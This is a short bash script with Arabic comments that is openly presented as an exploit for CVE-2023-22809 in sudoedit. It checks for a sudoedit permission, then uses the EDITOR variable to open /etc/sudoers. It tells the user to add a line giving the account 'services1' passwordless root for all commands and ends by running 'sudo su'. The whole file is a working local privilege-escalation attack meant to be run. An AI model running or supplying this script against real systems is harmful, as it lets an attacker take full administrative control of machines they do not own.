#!/bin/bash

echo "=== CVE-2023-22809 Exploit via sudoedit ==="

# تحقق من أن المستخدم عنده صلاحية على /root/file.txt فقط
if sudo -l | grep -q "sudoedit /root/file.txt"; then
    echo "[+] Valid sudoedit permission detected on /root/file.txt"
else
    echo "[-] Required sudoedit permission not found. Exiting."
    exit 1
fi

# طباعة تعليمات قبل تنفيذ الاستغلال
echo ""
echo "[*] Opening /etc/sudoers using sudoedit trick..."
echo "[*] Inside vim, add the following line at the end of the file:"
echo ""
echo "services1 ALL=(ALL:ALL) NOPASSWD: ALL"
echo ""
read -n 1 -s -r -p "Press any key to launch vim and begin exploit..."

# تنفيذ الثغرة
EDITOR="vim -- /etc/sudoers" sudoedit /root/file.txt

# تجربة التحول إلى root
echo ""
echo "[*] Attempting to escalate to root..."
sudo su
